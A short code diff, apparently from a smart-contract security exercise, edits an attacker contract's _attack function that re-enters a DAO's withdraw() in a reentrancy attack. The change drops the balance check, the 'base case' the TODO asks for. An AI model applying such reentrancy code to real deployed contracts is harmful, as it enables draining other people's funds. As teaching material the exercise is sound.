@@ -17,9 +17,8 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    if self.dao_address.balance > 0:
-        DAO(self.dao_address).withdraw()
-    #log Transfer((msg.sender, self.dao_address, self.dao_address.balance)
+    DAO(self.dao_address).withdraw()
+    
     return True
 
 @external
